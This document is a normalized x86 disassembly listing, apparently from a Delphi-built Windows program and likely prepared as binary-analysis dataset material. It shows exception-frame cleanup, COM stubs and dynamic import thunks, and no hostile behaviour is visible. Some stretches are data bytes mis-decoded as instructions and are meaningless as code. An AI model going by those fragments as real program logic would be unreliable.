jmp sub_403988
sub_466bbd
pop ecx
pop ebp
retn
sub_466c1e
jmp sub_403988
sub_466c25
pop ecx
pop ebp
retn
sub_466c28
retn
sub_466ce3
jmp sub_403988
sub_466cea
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_466d3f
jmp sub_403988
sub_466d46
pop ebx
pop ecx
pop ebp
retn 0x4
sub_466d8b
jmp sub_403988
sub_466d92
pop ebx
pop ecx
pop ebp
retn 0x4
sub_466e88
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x8000ffff
retn
push ecx
push edx
push eax
call [ rw-data ]
retn
sub_466f2b
jmp sub_403988
sub_466f32
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_466f91
jmp sub_403988
sub_466f98
pop ebp
retn
sub_466f9c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ r-xdata ]
push eax
xor ecx ecx
xor edx edx
mov eax [ r-xdata ]
call sub_4269f4
call sub_466d98
sub_466fc1
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4679b0
sub_466fcb
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4679c0
sub_466fd5
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4679d4
sub_466fdf
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4679e0
sub_466fe9
add [ esp + 0x4 ] 0xfffffff8
jmp sub_467920
sub_466ff3
add [ esp + 0x4 ] 0xfffffff8
jmp sub_467988
sub_466ffd
add [ esp + 0x4 ] 0xfffffff8
jmp sub_46799c
sub_467008
jmp 0xfffffffff346b67c
sub_4670bd
add [ esp + 0x4 ] 0xfffffdb4
jmp sub_46a384
sub_4670ca
add [ esp + 0x4 ] 0xfffffdb4
jmp sub_46a390
sub_4670d7
add [ esp + 0x4 ] 0xfffffdb4
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
sub_467852
jmp sub_403988
sub_467859
pop ebx
pop ecx
pop ebp
retn
sub_4678bd
jmp sub_403988
sub_4678c4
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4678fc
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403558
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_467977
add [ eax ] al
add al 0x2
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
sub_467988
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call sub_469a4c
pop ebp
retn 0x4
sub_46799c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call sub_469a64
pop ebp
retn 0x4
sub_4679b0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
xor eax eax
pop ebp
retn 0x8
sub_4679c0
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
xor edx edx
mov [ eax ] edx
mov eax 0x80004001
pop ebp
retn 0x10
sub_4679d4
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x18
j_sub_4036d4#8
jmp sub_4036d4
j_sub_4036d4#7
jmp sub_4036d4
sub_467ff4
jmp sub_403988
sub_467ffb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4681b6
jmp sub_403988
sub_4681bd
mov esp ebp
pop ebp
retn
sub_468279
jmp sub_4036d4
sub_4682a6
jmp sub_403988
sub_4682ad
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_4036d4#6
jmp sub_4036d4
sub_4683de
call sub_403a3c
pop edi
pop esi
pop ebx
pop ebp
retn
j_sub_403800#6
jmp sub_403800
sub_46855c
push ebx
mov ebx eax
mov eax [ ebx + 0x214 ]
test eax eax
je r-xdata
pop ebx
retn
push eax
call GlobalFree
xor eax eax
mov [ ebx + 0x214 ] eax
sub_46868c
add esp 0xfffffff0
mov ecx esp
call sub_4686c0
mov ax [ esp + 0x8 ]
add esp 0x10
retn
sub_468742
jmp sub_403988
sub_468749
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46879e
jmp sub_403988
sub_4687a5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_4036d4#5
jmp sub_4036d4
sub_468af1
jmp sub_4036d4
sub_468af6
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x8 ]
call sub_462838
call sub_403a3c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_468b14
retn
sub_468c65
jmp sub_403988
sub_468c6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_468c76
jmp sub_4036d4
sub_468c7b
mov eax [ ebp - 0x4 ]
call sub_46855c
call sub_403a3c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_468d38
call sub_468d58
retn
sub_468d40
add esp 0xfffffff0
mov [ esp ] 0x9
mov [ esp + 0x8 ] ecx
mov ecx esp
call sub_469028
add esp 0x10
retn
sub_468d58
add esp 0xfffffff0
mov [ esp ] 0x3
mov [ esp + 0x8 ] ecx
mov ecx esp
call sub_469028
add esp 0x10
retn
sub_468e16
jmp sub_403988
sub_468e1d
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_468e24
add esp 0xfffffff0
mov [ esp ] 0xb
test cx cx
je r-xdata
mov [ esp + 0x8 ] 0x0
mov [ esp + 0x8 ] 0xffff
jmp r-xdata
mov ecx esp
call sub_469028
add esp 0x10
retn
sub_468e50
call sub_469028
retn
sub_468ebd
jmp sub_4036d4
sub_468f28
jmp sub_403988
sub_468f2f
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_468ffd
jmp sub_403988
sub_46901a
jmp sub_403988
sub_469021
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4690cf
jmp sub_403988
sub_4690d6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_469130
jmp sub_403988
sub_469137
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4691de
jmp sub_403988
sub_4691e5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_4036d4#4
jmp sub_4036d4
sub_4693cc
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_462838
call sub_403a3c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46956c
jmp sub_403988
sub_469573
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469596
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_46855c
sub_46958f
jmp sub_403988
j_sub_403800#4
jmp sub_403800
sub_46973d
jmp sub_403988
sub_4697c7
jmp sub_403988
sub_4698ac
jmp sub_403988
sub_4698c9
jmp sub_403988
sub_4698d0
mov esp ebp
pop ebp
retn
sub_469a4c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
inc [ eax + 0x20c ]
mov eax [ eax + 0x20c ]
pop ebp
retn 0x4
sub_469a64
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
dec [ eax + 0x20c ]
mov eax [ eax + 0x20c ]
pop ebp
retn 0x4
sub_469a7c
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_469a88
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x10
xor edx edx
mov [ eax ] edx
sub_469aa0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004002
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_469ab8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_4687c4
xor eax eax
pop ebp
retn 0x4
sub_469acc
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_469b7c
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x4
sub_469c4c
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0xc
sub_469ca8
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_469df4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x230 ]
call sub_405a38
lea eax [ ebx + 0x22c ]
call sub_405a38
xor eax eax
pop ebx
pop ebp
retn 0x4
sub_469e7c
push ebp
mov ebp esp
mov eax 0x800401a1
pop ebp
retn 0x8
sub_469eac
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax ebx
call sub_4491ec
mov edx [ ebp + 0xc ]
mov [ edx ] eax
xor eax eax
pop ebx
pop ebp
retn 0x8
sub_469f68
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_469f74
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_469f80
push ebp
mov ebp esp
mov eax 0x1
pop ebp
retn 0xc
sub_469fb0
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x18
sub_46a059
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x8 ]
call sub_4678dc
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40f614
jmp sub_46a12a
sub_46a0a1
mov eax ebx
mov edx [ esi + 0x68 ]
mov edx [ edx + 0x18 ]
mov cl 0xfc
call sub_4136f4
jmp sub_46a12a
sub_46a0b2
call GetUserDefaultLCID
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_4136f4
jmp sub_46a12a
sub_46a0c4
mov eax ebx
mov dl 0x1
call sub_4138c4
jmp sub_46a12a
sub_46a0cf
mov eax ebx
test [ esi + 0x1c ] 0x10
setne dl
xor dl 0x1
call sub_4138c4
jmp sub_46a12a
sub_46a0e2
mov eax ebx
test [ esi + 0x1c ] 0x10
setne dl
call sub_4138c4
jmp sub_46a12a
sub_46a0f2
mov eax ebx
xor edx edx
call sub_4138c4
jmp sub_46a12a
sub_46a0fd
mov eax ebx
xor edx edx
call sub_4138c4
jmp sub_46a12a
sub_46a108
mov eax ebx
mov dl 0x1
call sub_4138c4
jmp sub_46a12a
sub_46a113
mov eax ebx
mov dl 0x1
call sub_4138c4
jmp sub_46a12a
sub_46a12a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a152
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404abc
retn
sub_46a14b
jmp sub_403988
sub_46a152
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_46a200
jmp sub_403988
sub_46a263
jmp sub_403988
sub_46a2c8
jmp sub_403988
sub_46a325
jmp sub_403988
j_sub_403800#3
jmp sub_403800
sub_46a364
jmp sub_403988
sub_46a36b
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46a378
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_46a384
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x1c
sub_46a390
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x1c
sub_46a3cd
jmp sub_403988
sub_46a3d4
pop ebp
retn
sub_46a420
jmp sub_403988
sub_46a427
pop ebp
retn
sub_46a451
jmp sub_403988
sub_46a458
pop ebp
retn
sub_46a45c
sub [ rw-data ] 0x1
retn
sub_46a4c1
jmp sub_403988
sub_46a4c8
pop ebp
retn
sub_46a4cc
sub [ rw-data ] 0x1
retn
sub_46a519
jmp sub_403988
sub_46a520
pop ebp
retn
sub_46a524
sub [ rw-data ] 0x1
retn
sub_46a7e4
add eax 0x4
call sub_46a7ac
retn
sub_46a9b0
push ebx
mov ebx eax
mov dx [ ebx + 0x6 ]
mov ax [ ebx + 0x4 ]
call sub_46a464
movzx eax ax
pop ebx
retn
sub_46aaf4
add esp 0xfffffff8
add eax 0x4
call sub_46b154
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
retn
sub_46ac9c
mov [ eax + 0x8 ] dx
retn
sub_46aca4
mov [ eax + 0x10 ] edx
retn
sub_46aca8
mov [ eax + 0xa ] dx
retn
sub_46acb0
mov [ eax + 0xc ] dx
retn
sub_46acb8
mov [ eax + 0x6 ] dx
retn
sub_46acc0
mov [ eax + 0xe ] dx
retn
sub_46acc8
mov [ eax + 0x4 ] dx
retn
sub_46acd0
mov [ edx ] 0x0
lea eax [ edx + 0x8 ]
call sub_40d524
retn
sub_46adb6
jmp sub_403988
sub_46ade3
jmp sub_403988
sub_46adea
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ae07
lea eax [ ebp - 0x2c ]
call sub_404008
retn
sub_46ae00
jmp sub_403988
sub_46ae07
pop ebx
mov esp ebp
pop ebp
retn
sub_46aeec
jmp sub_403988
sub_46af23
jmp sub_403988
sub_46af2a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46af80
mov eax [ edx + 0x8 ]
retn
sub_46b0fd
jmp sub_403988
sub_46b104
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46b2d8
jmp sub_403988
sub_46b2df
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46b319
jmp sub_403988
sub_46b320
pop ebp
retn
sub_46b324
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_414f20
mov [ rw-data ] eax
sub_46b650
jmp sub_403988
sub_46b657
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46b660
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
pop ebx
retn
sub_46b678
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
pop ebx
retn
sub_46b6b8
add edx 0x4
call sub_46b690
retn
sub_46b6ec
add edx 0x4
call sub_46b6c4
retn
sub_46b750
push ebx
push esi
mov esi edx
mov ebx eax
lea edx [ esi + 0x4 ]
lea eax [ ebx + 0x4 ]
call sub_46df20
inc eax
pop esi
pop ebx
retn
sub_46b7c5
jmp sub_403988
sub_46b7cc
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_46b815
jmp sub_403988
sub_46b81c
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_46b824
push ebx
mov ebx eax
mov eax ebx
call sub_46b7d4
pop ebx
retn
sub_46b830
add esp 0xfffffff8
mov edx esp
add eax 0x4
call sub_46e850
fild [ esp ]
pop ecx
pop edx
retn
sub_46b8cc
jmp sub_403988
sub_46b8d3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46b936
jmp sub_403988
sub_46b93d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46b944
movsx edx dx
call sub_46b8dc
retn
sub_46b950
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
add eax 0x4
mov ecx 0x4
mov edx 0x20
call sub_46e7c4
pop ebp
retn 0x8
sub_46ba58
jmp sub_403988
sub_46bb07
jmp sub_403988
sub_46bb6c
mov [ edx ] 0x0
lea eax [ edx + 0x8 ]
call sub_40d524
retn
sub_46bc5c
jmp sub_403988
sub_46bc89
jmp sub_403988
sub_46bc90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bcad
lea eax [ ebp - 0x2c ]
call sub_404008
retn
sub_46bca6
jmp sub_403988
sub_46bcad
pop ebx
mov esp ebp
pop ebp
retn
sub_46bd97
jmp sub_403988
sub_46bdce
jmp sub_403988
sub_46bdd5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46be80
mov eax [ edx + 0x8 ]
retn
sub_46bef2
jmp sub_403988
sub_46bef9
pop ebx
pop ecx
pop ebp
retn
sub_46bf48
jmp sub_403988
sub_46bf4f
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_46c076
jmp sub_403988
sub_46c07d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46c172
jmp sub_403988
sub_46c179
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_46c318
jmp sub_403988
sub_46c31f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_46c51f
jmp sub_403988
sub_46c526
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46c726
jmp sub_403988
sub_46c72d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46c925
jmp sub_403988
sub_46c92c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46cc50
jmp sub_403988
sub_46cc57
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46ce25
jmp sub_403988
sub_46ce2c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46cfc9
jmp sub_403988
sub_46cfd0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46d243
jmp sub_403988
sub_46d24a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46d3d9
jmp sub_403988
sub_46d3e0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46d4d0
jmp sub_403988
sub_46d4d7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46d8fd
jmp sub_403988
sub_46d904
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46e10d
jmp sub_403988
sub_46e114
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46e178
jmp sub_403988
sub_46e17f
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46e2be
jmp sub_403988
sub_46e2c5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46e334
jmp sub_403988
sub_46e33b
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46e61b
jmp sub_403988
sub_46e773
jmp sub_403988
sub_46e77a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46e7b8
mov al [ eax + 0x1 ]
and al 0x3f
and eax 0xff
retn
sub_46e919
jmp sub_403988
sub_46e920
pop ebp
retn
sub_46e924
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_414f20
mov [ rw-data ] eax
sub_46ebcf
dec [ ebx ]
add [ eax ] al
add [ esi + 0x4d ] al
push esp
inc edx
arpl [ esi + eax * 2 + 0x69 ] sp
insb
add ah ah
jmp r-xdata
in al dx
jmp sub_405ae4
sub_46ec15
add eax 0xffffffec
jmp r-xdata
retn
sub_46ec1d
add eax 0xffffffec
jmp sub_46ed78
sub_46ec25
add [ esp + 0x4 ] 0xffffffec
jmp sub_405ae4
sub_46ec2f
add [ esp + 0x4 ] 0xffffffec
jmp sub_405b0c
sub_46ec43
add eax 0xffffffe8
jmp r-xdata
mov al [ eax + 0xc ]
retn
sub_46ec4b
add eax 0xffffffe8
jmp r-xdata
mov [ eax + 0xc ] dl
retn
sub_46ec53
add [ esp + 0x4 ] 0xffffffe8
jmp sub_405ae4
sub_46ec5d
add [ esp + 0x4 ] 0xffffffe8
jmp sub_405b0c
sub_46ed78
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x10 ]
mov edx esi
call sub_40405c
pop esi
pop ebx
retn
sub_46eddc
jmp sub_403988
sub_46ede3
pop ebp
retn
sub_46ee49
jmp sub_403988
sub_46ee50
pop ebp
retn
sub_46ee98
retn
sub_46ee99
jmp sub_403988
j_sub_46ee98
jmp sub_46ee98
sub_46eea0
pop ebp
retn
sub_46eea4
sub [ rw-data ] 0x1
retn
sub_46ef29
jmp sub_403988
sub_46ef30
pop ebp
retn
sub_46ef34
sub [ rw-data ] 0x1
retn
sub_46f259
mov eax [ ebp - 0x8 ]
call sub_403234
retn
sub_46f262
jmp sub_403988
j_sub_46f259
jmp sub_46f259
sub_46f269
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f28b
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40402c
retn
sub_46f284
jmp sub_403988
sub_46f28b
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46f392
jmp sub_403988
sub_46f399
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f3bb
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40402c
retn
sub_46f3b4
jmp sub_403988
sub_46f3bb
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46f54c
jmp sub_403988
sub_46f553
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f57d
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_40402c
lea eax [ ebp - 0xc ]
call sub_404008
retn
sub_46f576
jmp sub_403988
sub_46f57d
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46f5d0
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_460720
retn
sub_46f605
jmp sub_403988
sub_46f60c
pop ebp
retn
sub_46f946
mov eax [ ebp - 0x8 ]
call sub_403234
retn
sub_46f94f
jmp sub_403988
j_sub_46f946
jmp sub_46f946
sub_46f956
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46f9da
jmp sub_403988
sub_46f9e1
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46fa53
jmp sub_403988
sub_46fa5a
pop ebx
pop ecx
pop ebp
retn
sub_46fac4
jmp sub_403988
sub_46facb
pop ebx
pop ecx
pop ebp
retn
sub_46fad0
push ebx
mov ebx eax
mov eax [ ebx + 0x318 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax [ ebx + 0x2fc ]
mov edx [ eax ]
call [ edx + 0xc4 ]
pop ebx
retn
sub_46fb38
jmp sub_403988
sub_46fb3f
pop ebx
pop ecx
pop ebp
retn
sub_46fb74
jmp sub_403988
sub_46fb7b
pop ebp
retn
sub_46fb80
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ rw-data ]
mov [ eax ] r-xdata
sub_46fb99
add eax 0xfffffff4
jmp sub_46fcf8
sub_46fba1
add eax 0xfffffff4
jmp sub_46fd0c
sub_46fba9
add eax 0xfffffff4
jmp sub_46fd5c
sub_46fbb1
add [ esp + 0x4 ] 0xfffffff4
jmp sub_405ae4
sub_46fbbb
add [ esp + 0x4 ] 0xfffffff4
jmp sub_405b0c
sub_46fbd7
add eax 0xfffffff0
jmp sub_46fd1c
sub_46fbdf
add [ esp + 0x4 ] 0xfffffff0
jmp sub_405ae4
sub_46fbe9
add [ esp + 0x4 ] 0xfffffff0
jmp sub_405b0c
sub_46fcf8
push ebx
mov ebx edx
mov edx ebx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46224c
pop ebx
retn
sub_46fd0c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46258c
retn
sub_46fd5c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_462298
retn
sub_46fe23
jmp sub_403988
sub_46fe2a
pop ebp
retn
sub_46fec0
retn
sub_46fec1
jmp sub_403988
j_sub_46fec0
jmp sub_46fec0
sub_46fec8
pop ebp
retn
sub_46fecc
sub [ rw-data ] 0x1
retn
sub_46fef9
jmp sub_403988
sub_46ff00
pop ebp
retn
sub_46ff04
sub [ rw-data ] 0x1
retn
sub_46ff31
jmp sub_403988
sub_46ff38
pop ebp
retn
sub_46ff3c
sub [ rw-data ] 0x1
retn
sub_470995
jmp sub_403988
sub_47099c
pop ebp
retn
sub_4709a0
sub [ rw-data ] 0x1
retn
sub_470c1d
jmp sub_403988
sub_470c24
pop ebp
retn
sub_470c28
sub [ rw-data ] 0x1
retn
sub_470d48
jmp sub_403988
sub_470d80
push 0x0
push rw-data
call InterlockedExchange
test eax eax
je r-xdata
retn
push eax
call FreeLibrary
call sub_471be0
sub_470d9c
mov eax 0x0
call sub_471b2c
jmp eax
sub_470da8
retn
sub_470dac
mov eax 0x1
call sub_471b2c
jmp eax
sub_470db8
retn
sub_470dbc
mov eax 0x2
call sub_471b2c
jmp eax
sub_470dc8
retn
sub_470dcc
mov eax 0x3
call sub_471b2c
jmp eax
sub_470dd8
retn
sub_470ddc
mov eax 0x4
call sub_471b2c
jmp eax
sub_470de8
retn
sub_470dec
mov eax 0x5
call sub_471b2c
jmp eax
sub_470df8
retn
sub_470dfc
mov eax 0x6
call sub_471b2c
jmp eax
sub_470e08
retn
sub_470e0c
mov eax 0x7
call sub_471b2c
jmp eax
sub_470e18
retn
sub_470e1c
mov eax 0x8
call sub_471b2c
jmp eax
sub_470e28
retn
sub_470e2c
mov eax 0x9
call sub_471b2c
jmp eax
sub_470e38
retn
sub_470e3c
mov eax 0xa
call sub_471b2c
jmp eax
sub_470e48
retn
sub_470e4c
mov eax 0xb
call sub_471b2c
jmp eax
sub_470e58
retn
sub_470e5c
mov eax 0xc
call sub_471b2c
jmp eax
sub_470e68
retn
sub_470e6c
mov eax 0xd
call sub_471b2c
jmp eax
sub_470e78
retn
sub_470e7c
mov eax 0xe
call sub_471b2c
jmp eax
sub_470e88
retn
sub_470e8c
mov eax 0xf
call sub_471b2c
jmp eax
sub_470e98
retn
sub_470e9c
mov eax 0x10
call sub_471b2c
jmp eax
sub_470ea8
retn
sub_470eac
mov eax 0x11
call sub_471b2c
jmp eax
sub_470eb8
retn
sub_470ebc
mov eax 0x12
call sub_471b2c
jmp eax
sub_470ec8
retn
sub_470ecc
mov eax 0x13
call sub_471b2c
jmp eax
sub_470ed8
retn
sub_470edc
mov eax 0x14
call sub_471b2c
jmp eax
sub_470ee8
retn
sub_470eec
mov eax 0x15
call sub_471b2c
jmp eax
sub_470ef8
retn
sub_470efc
mov eax 0x16
call sub_471b2c
jmp eax
sub_470f08
retn
sub_470f0c
mov eax 0x17
call sub_471b2c
jmp eax
sub_470f18
retn
sub_470f1c
mov eax 0x18
call sub_471b2c
jmp eax
sub_470f28
retn
sub_470f2c
mov eax 0x19
call sub_471b2c
jmp eax
sub_470f38
retn
sub_470f3c
mov eax 0x1a
call sub_471b2c
jmp eax
sub_470f48
retn
sub_470f4c
mov eax 0x1b
call sub_471b2c
jmp eax
sub_470f58
retn
sub_470f5c
mov eax 0x1c
call sub_471b2c
jmp eax
sub_470f68
retn
sub_470f6c
mov eax 0x1d
call sub_471b2c
jmp eax
sub_470f78
retn
sub_470f7c
mov eax 0x1e
call sub_471b2c
jmp eax
sub_470f88
retn
sub_470f8c
mov eax 0x1f
call sub_471b2c
jmp eax
sub_470f98
retn
sub_470f9c
mov eax 0x20
call sub_471b2c
jmp eax
sub_470fa8
retn
sub_470fac
mov eax 0x21
call sub_471b2c
jmp eax
sub_470fb8
retn
sub_470fbc
mov eax 0x22
call sub_471b2c
jmp eax
sub_470fc8
retn
sub_470fcc
mov eax 0x23
call sub_471b2c
jmp eax
sub_470fd8
retn
sub_470fdc
mov eax 0x24
call sub_471b2c
jmp eax
sub_470fe8
retn
sub_470fec
mov eax 0x25
call sub_471b2c
jmp eax
sub_470ff8
retn
sub_470ffc
mov eax 0x26
call sub_471b2c
jmp eax
sub_471008
retn
sub_47100c
mov eax 0x27
call sub_471b2c
jmp eax
sub_471018
retn
sub_47101c
mov eax 0x28
call sub_471b2c
jmp eax
sub_471028
retn
sub_47102c
mov eax 0x29
call sub_471b2c
jmp eax
sub_471038
retn
sub_47103c
mov eax 0x2a
call sub_471b2c
jmp eax
sub_471048
retn
sub_47104c
mov eax 0x2b
call sub_471b2c
jmp eax
sub_471058
retn
sub_47105c
mov eax 0x2c
call sub_471b2c
jmp eax
sub_471068
retn
sub_47106c
mov eax 0x2d
call sub_471b2c
jmp eax
sub_471078
retn
sub_47107c
mov eax 0x2e
call sub_471b2c
jmp eax
sub_471088
retn
sub_47108c
mov eax 0x2f
call sub_471b2c
jmp eax
sub_471098
retn
sub_47109c
mov eax 0x30
call sub_471b2c
jmp eax
sub_4710a8
retn
sub_4710ac
mov eax 0x31
call sub_471b2c
jmp eax
sub_4710b8
retn
sub_4710bc
mov eax 0x32
call sub_471b2c
jmp eax
sub_4710c8
retn
sub_4710cc
mov eax 0x33
call sub_471b2c
jmp eax
sub_4710d8
retn
sub_4710dc
mov eax 0x34
call sub_471b2c
jmp eax
sub_4710e8
retn
sub_4710ec
mov eax 0x35
call sub_471b2c
jmp eax
sub_4710f8
retn
sub_4710fc
mov eax 0x36
call sub_471b2c
jmp eax
sub_471108
retn
sub_47110c
mov eax 0x37
call sub_471b2c
jmp eax
sub_471118
retn
sub_47111c
mov eax 0x38
call sub_471b2c
jmp eax
sub_471128
retn
sub_47112c
mov eax 0x39
call sub_471b2c
jmp eax
sub_471138
retn
sub_47113c
mov eax 0x3a
call sub_471b2c
jmp eax
sub_471148
retn
sub_47114c
mov eax 0x3b
call sub_471b2c
jmp eax
sub_471158
retn
sub_47115c
mov eax 0x3c
call sub_471b2c
jmp eax
sub_471168
retn
sub_47116c
mov eax 0x3d
call sub_471b2c
jmp eax
sub_471178
retn
sub_47117c
mov eax 0x3e
call sub_471b2c
jmp eax
sub_471188
retn
sub_47118c
mov eax 0x3f
call sub_471b2c
jmp eax
sub_471198
retn
sub_47119c
mov eax 0x40
call sub_471b2c
jmp eax
